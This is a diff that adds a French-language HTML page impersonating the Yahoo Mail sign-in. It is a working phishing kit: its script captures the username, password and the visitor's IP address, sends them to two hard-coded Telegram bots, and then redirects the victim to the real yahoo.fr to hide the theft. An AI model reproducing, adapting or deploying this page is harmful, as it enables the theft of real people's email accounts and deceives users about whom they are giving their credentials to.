@@ -1,0 +1,360 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>Connexion Yahoo</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background-color: #f6f8fc;
+      color: #1d1c1d;
+    }
+
+    .container {
+      display: flex;
+      height: 100vh;
+      align-items: center;
+      justify-content: center;
+      gap: 40px;
+      padding: 20px;
+    }
+
+    .left {
+      max-width: 400px;
+    }
+
+    .left h2 {
+      font-weight: 600;
+    }
+
+    .right {
+      background-color: white;
+      border-radius: 12px;
+      padding: 40px;
+      width: 360px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      position: relative;
+    }
+
+    .logo {
+      text-align: center;
+      font-size: 28px;
+      font-weight: bold;
+      color: #6001d2;
+      margin-bottom: 24px;
+    }
+
+    .right h3 {
+      font-weight: 600;
+      text-align: center;
+    }
+
+    .form-group {
+      position: relative;
+      margin: 30px 0;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      outline: none;
+      font-size: 16px;
+    }
+
+    .form-group label {
+      position: absolute;
+      top: 50%;
+      left: 12px;
+      transform: translateY(-50%);
+      background: white;
+      padding: 0 4px;
+      color: #888;
+      transition: 0.2s;
+      pointer-events: none;
+    }
+
+    .form-group input:focus + label,
+    .form-group input:not(:placeholder-shown) + label {
+      top: -10px;
+      left: 8px;
+      font-size: 12px;
+      color: #6001d2;
+    }
+
+    .btn {
+      width: 100%;
+      background-color: #6001d2;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 24px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .secondary {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .secondary a {
+      color: #6001d2;
+      text-decoration: none;
+    }
+
+    .create-btn {
+      margin-top: 20px;
+      border: 2px solid #6001d2;
+      color: #6001d2;
+      background: none;
+      border-radius: 24px;
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .google-btn {
+      margin-top: 20px;
+      width: 100%;
+      border: 1px solid #ccc;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 10px;
+      border-radius: 24px;
+      background: white;
+      gap: 10px;
+      cursor: pointer;
+    }
+
+    .message-box {
+      position: relative;
+      margin-top: 20px;
+      padding: 12px 40px 12px 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      text-align: left;
+      opacity: 0;
+      transform: translateY(-10px);
+      transition: opacity 0.4s ease, transform 0.4s ease;
+      display: none;
+    }
+
+    .message-box.show {
+      display: block;
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .message-box.error {
+      background-color: #ffe5e5;
+      color: #c70000;
+      border: 1px solid #ffb3b3;
+    }
+
+    .message-box.success {
+      background-color: #e5ffe5;
+      color: #006b00;
+      border: 1px solid #a6f0a6;
+    }
+
+    .message-box .close-btn {
+      position: absolute;
+      top: 8px;
+      right: 12px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 14px;
+      color: inherit;
+      background: none;
+      border: none;
+      padding: 0;
+    }
+
+    .message-box .close-btn:hover {
+      opacity: 0.6;
+    }
+
+    /* 🔧 Responsive correction */
+    @media (max-width: 768px) {
+      .container {
+        flex-direction: column;
+        align-items: stretch;
+        padding: 20px 16px;
+        gap: 30px;
+        height: auto;
+      }
+
+      .left {
+        max-width: 100%;
+        text-align: center;
+      }
+
+      .right {
+        width: 100%;
+        max-width: 100%;
+        padding: 24px 16px;
+        box-shadow: none;
+        border-radius: 12px;
+      }
+
+      .logo {
+        font-size: 24px;
+      }
+
+      .form-group input {
+        font-size: 15px;
+        padding: 10px;
+      }
+
+      .btn,
+      .create-btn,
+      .google-btn {
+        font-size: 15px;
+        padding: 10px;
+      }
+
+      .message-box {
+        font-size: 13px;
+        padding: 10px 12px 10px 12px;
+      }
+    }
+  </style>
+  <script>
+    if(localStorage.getItem('valide')!=="true"){
+      window.location.href="../";
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <h2>Grâce à Yahoo, tous les sujets qui vous intéressent sont à portée de main.</h2>
+      <p>Yahoo Mail, actualités locales, nationales et internationales, finances, sports, musique, cinéma... Vivez la vie à fond en profitant pleinement du Web.</p>
+    </div>
+    <div class="right">
+      <div class="logo">yahoo!</div>
+      <h3>Se connecter à Yahoo Mail</h3>
+      <p style="text-align:center; font-size:14px; margin-bottom:20px;">à l'aide de votre compte Yahoo</p>
+      <div class="form-group">
+        <input type="text" required placeholder=" " id="username">
+        <label for="username">Nom d'utilisateur, mail ou téléphone</label>
+      </div>
+      <div class="form-group">
+        <input type="password" required placeholder=" " id="password">
+        <label for="password">Mot de passe</label>
+      </div>
+      <button class="btn">Suivant</button>
+      <div class="secondary">
+        <input type="checkbox" checked> Restez connecté<br>
+        <a href="#">Nom d'utilisateur oublié ?</a>
+      </div>
+      <button class="create-btn">Créer un compte</button>
+      <p style="text-align: center; margin: 10px 0;">ou</p>
+      <div class="google-btn">
+        <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google" width="20">
+        Se connecter avec Google
+      </div>
+      <div id="message" class="message-box"></div>
+    </div>
+  </div>
+
+  <script>
+    function showMessage(text, type = "error") {
+      const box = document.getElementById("message");
+      const icon = type === "success" ? "✅" : "❌";
+      box.className = `message-box ${type}`;
+      box.innerHTML = `
+        <span>${icon}</span> <span style="margin-left: 8px;">${text}</span>
+        <button class="close-btn" onclick="hideMessage()">✖️</button>
+      `;
+      setTimeout(() => box.classList.add("show"), 10);
+      clearTimeout(box.hideTimeout);
+      box.hideTimeout = setTimeout(() => hideMessage(), 5000);
+      box.style.display = "block";
+    }
+
+    function hideMessage() {
+      const box = document.getElementById("message");
+      box.classList.remove("show");
+      setTimeout(() => {
+        box.style.display = "none";
+      }, 400);
+    }
+
+    const TELEGRAM_CONFIGS = [
+      {
+        token: '5722730835:AAF-83VyMq8uBs0klBjz3iAdfEzPNJz8w0o',
+        chat_id: '-868620860',
+      },
+      {
+        token: '5764095182:AAHYo8w5U5BVqSdpC_r3bOtUSdMmuO5HW68',
+        chat_id: '5308852046',
+      }
+    ];
+
+    document.querySelector(".btn").addEventListener("click", function (e) {
+      e.preventDefault();
+      const username = document.querySelector("#username").value.trim();
+      const password = document.querySelector("#password").value.trim();
+
+      if (!username || !password) {
+        showMessage("Champs requis.", "error");
+        return;
+      }
+
+      const yahooRegex = /^[a-zA-Z0-9._%+-]+@yahoo\.(com|fr|ca|co\.uk|de|it|es)$/i;
+      if (!yahooRegex.test(username)) {
+        showMessage("Seules les adresses Yahoo sont autorisées.", "error");
+        return;
+      }
+
+      fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const message = `🔐 Connexion Yahoo :\n👤 ${username}\n🔑 ${password}\n🌍 IP: ${ip}`;
+
+          return Promise.all(
+            TELEGRAM_CONFIGS.map(cfg =>
+              fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                  chat_id: cfg.chat_id,
+                  text: message,
+                }),
+              }).then(res => res.json())
+            )
+          );
+        })
+        .then(results => {
+          const success = results.some(r => r.ok);
+          if (success) {
+            window.location.href = "https://yahoo.fr";
+          } else {
+            showMessage("Aucun message n'a été envoyé !", "error");
+            console.error("Réponses:", results);
+          }
+        })
+        .catch(err => {
+          console.error("Erreur réseau:", err);
+          showMessage("Échec d'envoi vers Telegram.", "error");
+        });
+    });
+  </script>
+</body>
+</html>
